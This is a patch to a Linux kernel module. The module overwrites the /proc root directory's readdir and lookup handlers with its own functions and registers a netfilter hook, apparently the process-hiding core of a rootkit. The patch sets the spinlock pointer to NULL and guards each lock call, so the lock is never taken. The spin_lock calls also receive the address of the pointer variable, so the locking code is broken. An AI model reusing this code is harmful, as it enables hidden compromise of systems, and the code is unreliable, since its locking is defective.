@@ -14,7 +14,7 @@
 /* This is the structure we shall use to register our function */
 static struct nf_hook_ops nfho;
 
-spinlock_t	 *_proc_dir_spinlock;
+spinlock_t	 *_proc_dir_spinlock = NULL;
 
 /* Backup of the previous handlers */ 
 struct file_operations proc_original_file_operations;
@@ -62,12 +62,14 @@ int init_module ()
 	proc_original_inode_operations.lookup = proc_root.proc_iops->lookup;
 	
 	// New handlers. With a bit of magic because the compiler is stupid
-	spin_lock(&_proc_dir_spinlock);
+	if(_proc_dir_spinlock)
+		spin_lock(&_proc_dir_spinlock);
 
 	((struct file_operations *)  ((void *)(proc_root.proc_fops)))->readdir = new_proc_readdir;
 	((struct inode_operations *) ((void *)(proc_root.proc_iops)))->lookup = new_proc_lookup;
   
-	spin_unlock(&_proc_dir_spinlock);
+	if(_proc_dir_spinlock)
+		spin_unlock(&_proc_dir_spinlock);
 
 	return 0;
 }
@@ -80,12 +82,14 @@ void cleanup_module ()
 	nf_unregister_hook (&nfho);
 
 	// Restore proc fs handlers.
-	spin_lock(&_proc_dir_spinlock);
+	if(_proc_dir_spinlock)
+		spin_lock(&_proc_dir_spinlock);
 
 	((struct file_operations *)  ((void *)(proc_root.proc_fops)))->readdir = proc_original_file_operations.readdir;
 	((struct inode_operations *) ((void *)(proc_root.proc_iops)))->lookup = proc_original_inode_operations.lookup ;
 
-	spin_unlock(&_proc_dir_spinlock);
+	if(_proc_dir_spinlock)
+		spin_unlock(&_proc_dir_spinlock);
 
 }
 
